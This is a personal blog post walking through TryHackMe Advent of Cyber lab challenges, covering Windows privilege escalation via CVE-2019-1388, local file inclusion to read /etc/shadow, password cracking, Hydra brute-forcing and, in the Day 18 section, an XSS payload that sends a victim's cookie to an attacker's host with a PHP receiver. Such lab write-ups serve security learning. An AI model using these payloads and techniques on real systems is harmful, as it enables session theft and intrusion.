<!DOCTYPE html>
<html lang="en-US">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Try Hackme Advent of Cyber Day13 to Day18 Walkthrough</title>
  <meta name="description" content="Just a simple walkthrough">
  <link rel="canonical" href="https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18">
  <link rel="alternate" type="application/rss+xml" title="Naughtyb0y&#39;s Blog Feed"
    href="https://naughtyb0y.onrender.com/feed.xml">
  
  <link rel="shortcut icon" href="/images/favicon.png" type="image/png" />
  
  <!-- Styles -->
  <link href="https://fonts.googleapis.com/css?family=Lato:400,400i,700,700i%7CNoto+Serif:400,400i,700,700i&display=swap" rel="stylesheet">
  <link href="/assets/css/style.css" rel="stylesheet">
</head>
<body>

  <div id="page" class="site">
    <div class="inner">
      <header class="site-header">
  
  <p class="site-title"><a class="logo-text" href="/">Naughtyb0y's Blog</a></p>
  
  <nav class="site-navigation">
    <div class="site-navigation-wrap">
      <h2 class="screen-reader-text">Main navigation</h2>
      <ul class="menu">
        
        
        
        <li class="menu-item ">
          <a class="" href="/">Home</a>
        </li>
        
        
        
        <li class="menu-item ">
          <a class="" href="/about">About</a>
        </li>
        
        
        
        <li class="menu-item ">
          <a class="" href="/tags">Tags</a>
        </li>
        
      </ul><!-- .menu -->
      <button id="menu-close" class="menu-toggle"><span class="screen-reader-text">Close Menu</span><span
          class="icon-close" aria-hidden="true"></span></button>
    </div><!-- .site-navigation-wrap -->
  </nav><!-- .site-navigation -->
  <button id="menu-open" class="menu-toggle"><span class="screen-reader-text">Open Menu</span><span class="icon-menu" aria-hidden="true"></span></button>
</header>


      <main class="main-content fadeInDown delay_075s">

  <article class="post">
    <header class="post-header">
      <time class="post-date" datetime="2020-03-08">March 8, 2020</time>
      <h1 class="post-title">Try Hackme Advent of Cyber Day13 to Day18 Walkthrough</h1>
      <div class="post-meta">
        By <span class="post-author">Nirmit Shah</span><span class="post-tags"> in <a href="/tags" rel="tag">TryHackMe</a>, <a href="/tags" rel="tag">Advent_Of_Cyber</a></span>
      </div><!-- .post-meta -->
      
      <figure class="post-thumbnail image-card width-wide">
        <img src="/images/thm_advent/front.jpg" alt="Try Hackme Advent of Cyber Day13 to Day18 Walkthrough">
      </figure><!-- .post-thumbnail -->
      
    </header><!-- .post-header -->
    <div class="post-content">
      <!--more-->
<p>So this is third part to the Advent_of_Cyber 25 part Series on <a href="https://tryhackme.com">https://tryhackme.com</a></p>

<h2 id="day13task-18">Day13(Task 18)</h2>
<p>I started my day today with one of the most frustrating machines to root ,it was this machine
Starting with a nmap scan as usual</p>

<p><img src="images/thm_advent/50.png" alt="" /></p>

<p>we see ports 80(http),3389(rdp) open and found about the services by selective scans
Checking out the http page,nothing interesting</p>

<p><img src="images/thm_advent/51.png" alt="" /></p>

<p>running gobuster for hidden directory search ,found a hidden directory <strong>retro</strong> which turns out to be a blog</p>

<p><img src="images/thm_advent/52.png" alt="" /></p>

<p>checking out the comment by <strong>wade</strong>,i thought that maybe  this is one of the users and got the password as <strong>parzival</strong>
as metioned in the comment</p>

<p><img src="images/thm_advent/53.png" alt="" /></p>

<p>logging into wordpress dashboard doesn’t give us anything useful either</p>

<p><img src="images/thm_advent/54.png" alt="" /></p>

<p>now using <strong>Remmina</strong> for rdp connection instead of default as it hash gui and easy to use 
got the user.txt file on the desktop itself which is one of the flag</p>

<p><img src="images/thm_advent/56.png" alt="" /></p>

<p>now on open chrome i got a bookmark refering to a particular vulnerablitiy leading to priv esc in windows server 16
i found a <a href="https://github.com/jas502n/CVE-2019-1388/blob/master/CVE-2019-1388.gif">gif</a> related to this</p>

<p>so i start with making the internet explorer the default application as  I saw in the gif</p>

<p><img src="images/thm_advent/55.png" alt="" />
I could also see the link to the certificate on hovering around the link</p>

<p><img src="images/thm_advent/57.png" alt="" /></p>

<p>on chossing internet explorer it showed that this page can’t be displayed
so lets save it ,just following the gif</p>

<p><img src="images/thm_advent/59.png" alt="" /></p>

<p>using the name field to navigate to <strong>cmd.exe</strong> file in system32 folder</p>

<p><img src="images/thm_advent/63.png" alt="" /></p>

<p><img src="images/thm_advent/58.png" alt="" /></p>

<p><img src="images/thm_advent/60.png" alt="" /></p>

<p>finally got the command prompt and on checking the user it was the administrator so lets read the root flag</p>

<p><img src="images/thm_advent/61.png" alt="" /></p>

<p>got the flag in the desktop folder of the admin</p>

<p><img src="images/thm_advent/62.png" alt="" /></p>

<p>This was literally one of the toughest one in the series till now as it used knowledge from the previous task as well</p>

<h2 id="day14task-19">Day14(Task 19)</h2>
<p>it was just a basics amazon aws bucket access task</p>

<p><img src="images/thm_advent/64.png" alt="" /></p>

<p><img src="images/thm_advent/65.png" alt="" /></p>

<p>I don’t even need to explain it :)</p>

<h2 id="day15task-20">Day15(Task 20)</h2>
<p>we have are given a box so lets start with the nmap scan first as always</p>

<p><img src="images/thm_advent/66.png" alt="" /></p>

<p>Lets checkout the webpage get the answer to the first question here itself</p>

<p><img src="images/thm_advent/67.png" alt="" /></p>

<p>As it was mentioned in the challenge title it was a Local File Inclusion(LFI) task it was very similar to the one I did in the Natas wargame so I checked the /etc/passwd file first and we got charlie as one of the users</p>

<p><img src="images/thm_advent/68.png" alt="" /></p>

<p>checking out the /etc/shadow file to get charlie’s password hash</p>

<p><img src="images/thm_advent/69.png" alt="" /></p>

<p>cracking the hash with john</p>

<p><img src="images/thm_advent/70.png" alt="" /></p>

<p>the follwing task was simple just login to ssh using credentials found and read the flag</p>

<p><img src="images/thm_advent/71.png" alt="" /></p>

<h2 id="day16task-21">Day16(Task 21)</h2>
<p>This challenge was more of a scripting challenge</p>

<h3 id="task1">task1</h3>
<p>we have to find the no. of non-zip files after all the decompression 
the script is a little bit messy but worked for me</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">zipfile</span>
<span class="kn">import</span> <span class="nn">os</span>

<span class="n">count</span><span class="o">=</span><span class="mi">0</span>

<span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s">'final-final-compressed.zip'</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">zip_1</span><span class="p">:</span>
	<span class="n">zip_1</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="s">"decompress_1"</span><span class="p">)</span>

<span class="n">list_f</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"decompress_1"</span><span class="p">)</span>
<span class="c1"># print(list_f)
</span>
<span class="k">for</span> <span class="n">a</span> <span class="ow">in</span> <span class="n">list_f</span><span class="p">:</span>
	<span class="k">with</span> <span class="n">zipfile</span><span class="o">.</span><span class="n">ZipFile</span><span class="p">(</span><span class="s">"decompress_1/"</span><span class="o">+</span><span class="n">a</span><span class="p">,</span><span class="s">"r"</span><span class="p">)</span> <span class="k">as</span> <span class="n">zip_1</span><span class="p">:</span>
		<span class="n">zip_1</span><span class="o">.</span><span class="n">extractall</span><span class="p">(</span><span class="s">"decompress_2"</span><span class="p">)</span>

<span class="k">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"decompress_2"</span><span class="p">)))</span>

</code></pre></div></div>

<h3 id="task-2">task 2</h3>
<p>we have to check the metadata of the .txt file found in the previous task and check which all have Version: 1.1 in the metadata</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">os</span> 
<span class="kn">import</span> <span class="nn">exiftool</span>

<span class="n">m_count</span><span class="o">=</span><span class="mi">0</span>
<span class="nb">file</span><span class="o">=</span><span class="p">[]</span>

<span class="n">list_f</span><span class="o">=</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s">"./"</span><span class="p">)</span>
<span class="c1"># print(list_f)
</span>
<span class="k">for</span> <span class="n">l</span> <span class="ow">in</span> <span class="n">list_f</span><span class="p">:</span>
	<span class="nb">file</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>

<span class="k">with</span> <span class="n">exiftool</span><span class="o">.</span><span class="n">ExifTool</span><span class="p">()</span> <span class="k">as</span> <span class="n">exif</span><span class="p">:</span>
	<span class="n">metadata</span><span class="o">=</span><span class="n">exif</span><span class="o">.</span><span class="n">get_metadata_batch</span><span class="p">(</span><span class="nb">file</span><span class="p">)</span>

<span class="k">for</span> <span class="n">d</span> <span class="ow">in</span> <span class="n">metadata</span><span class="p">:</span>
	<span class="k">try</span><span class="p">:</span>
		<span class="k">if</span><span class="p">(</span><span class="n">d</span><span class="p">[</span><span class="s">u'XMP:Version'</span><span class="p">]</span><span class="o">==</span><span class="mf">1.1</span><span class="p">):</span>
			<span class="c1"># print(d)
</span>			<span class="n">m_count</span><span class="o">+=</span><span class="mi">1</span>
	<span class="k">except</span><span class="p">:</span>
		<span class="k">continue</span>
	<span class="c1"># print(d)
</span>	<span class="c1"># print("\n")
</span>
<span class="k">print</span><span class="p">(</span><span class="n">m_count</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="task-3">task 3</h3>
<p>we have to find the name of the file which contains the string <strong>password</strong> this can be done simply without using any script with the help of grep</p>

<p><img src="images/thm_advent/72.png" alt="" /></p>

<h2 id="day17task-22">Day17(Task 22)</h2>
<p>this task was an introduction to <strong><em>Hydra</em></strong> which is a brute force online password cracking program; a quick system login password ‘hacking’ tool.
first we had to brute-force the password for user molly in the http-post-form using rockyou.txt 
using gobuster to find the login directory ,I am lazy did not wanted to guess the directory</p>

<p><img src="images/thm_advent/73.png" alt="" /></p>

<p>while the brute for login page was running I decided to brutforce the ssh pass in another tab 
and got the pass almost instantly</p>

<p><img src="images/thm_advent/74.png" alt="" /></p>

<p>next I login through ssh and get the second flag</p>

<p><img src="images/thm_advent/75.png" alt="" /></p>

<p>while the brute force for login was running I viewed the other file present in the server and came across an interesting file which had the initial flag and password for the login form and yet still that hydra script was running,<strong>lol</strong></p>

<p><img src="images/thm_advent/76.png" alt="" /></p>

<h2 id="day18task-23">Day18(Task 23)</h2>

<p>this task was very interesting as I learnt many more things about XSS rather than it just being a vulnerability
we are presented with the site,just a normal login form and register page was not vulnerable to SQLi so registering as a normal user</p>

<p><img src="images/thm_advent/77.png" alt="" /></p>

<p>while logging in we see in the request it shows that there is authid assigned to each user and so is  for admin so our
goal was to get the authid for the admin</p>

<p><img src="images/thm_advent/78.png" alt="" /></p>

<p>After logging in we get a forum page where we can post a comment and this comment input field was vulnerable to XSS
so I read about how to steal cookies using XSS and found an article mention to use</p>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;document.location="http://&lt;machine-ip&gt;/cookie.php?c="+document.cookie&lt;/script&gt;
</code></pre></div></div>
<p>the above thing as payload 
and the cookie.php file is very trivial one</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
	<span class="nv">$cookie</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"c"</span><span class="p">];</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>
<p>I setup a php lister at port 8000 and get the admin authid after a few minutes after submitting the comment</p>

<p><img src="images/thm_advent/79.png" alt="" /></p>

<p>Now this authid can be used to forge the cookie and login as admin into the forum
That’s it for today</p>

    </div><!-- .post-content -->
    <div class="post-share">
      <span>Share:</span>
      <a target="_blank"
        href="https://twitter.com/intent/tweet?text=Try%20Hackme%20Advent%20of%20Cyber%20Day13%20to%20Day18%20Walkthrough&amp;url=https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18" rel="noopener">Twitter</a>
      <a target="_blank"
        href="https://www.facebook.com/sharer/sharer.php?u=https://naughtyb0y.onrender.com/Try-Hack-Me-Advent-Of-Cyber-Day13_to_Day18&amp;t=Try%20Hackme%20Advent%20of%20Cyber%20Day13%20to%20Day18%20Walkthrough" rel="noopener">Facebook</a>
    </div><!-- .share-post -->
    <div class="author-box">
      
      <div class="author-avatar" style="background-image: url('images/about.jpg')"><span class="screen-reader-text">Nirmit Shah's Picture</span></div>
      
      <div class="author-details">
        <h2 class="author-title">About Nirmit Shah</h2>
        <div class="author-bio"><p>Nirmit is a programmer, noob-hacker, a member of Cyberlabs, IIT (ISM) Dhanbad.</p>
</div>
        
        <span class="author-location">Pune, India</span>
        
        
      </div><!-- .author-details -->
    </div><!-- .author-box -->
  </article><!-- .post -->

  
    <div class="comments-area">
  <div class="comments-inner">
    <h2 class="comments-title">Comments</h2>
    <div id="disqus_thread"></div>
    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by
        Disqus</a>.</noscript>
  </div><!-- .comments-inner -->
</div><!-- .comments-area -->

<script type="text/javascript">
  var disqus_shortname = 'my-blog-npmbtu8spk';
  var disqus_developer = 0;
  (function () {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
    dsq.src = 'https://' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>
  

</main><!-- .main-content -->
      <footer class="site-footer">
  <div class="offsite-links">
    
      
<a href="https://twitter.com/Nirmits09888706" target="_blank" rel="noopener">
  <span class="fa-twitter" aria-hidden="true"></span>
  <span class="screen-reader-text">Twitter</span>
</a>

<a href="https://github.com/naughtyboy191" target="_blank" rel="noopener">
  <span class="fa-github" aria-hidden="true"></span>
  <span class="screen-reader-text">GitHub</span>
</a>

<a href="https://www.linkedin.com/in/nirmit-shah-35822a146" target="_blank" rel="noopener">
  <span class="fa-linkedin" aria-hidden="true"></span>
  <span class="screen-reader-text">LinkedIn</span>
</a>

    
  </div><!-- .offsite-links -->
  <div class="footer-bottom">
    <div class="site-info">
      <p>© Naughtyb0y all rights reserved.</p>

    </div><!-- .site-info -->
    <a href="#page" id="back-to-top" class="back-to-top"><span class="screen-reader-text">Back to the top </span>&#8593;</a>
  </div><!-- .footer-bottom -->
</footer><!-- .site-footer -->

    </div><!-- .inner -->
  </div><!-- .site -->

  <!-- Scripts -->
  
    <script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', '', 'auto');
  ga('send', 'pageview');
</script>
  
  <script src="/assets/js/plugins.js"></script>
  <script src="/assets/js/custom.js"></script>

</body>
</html>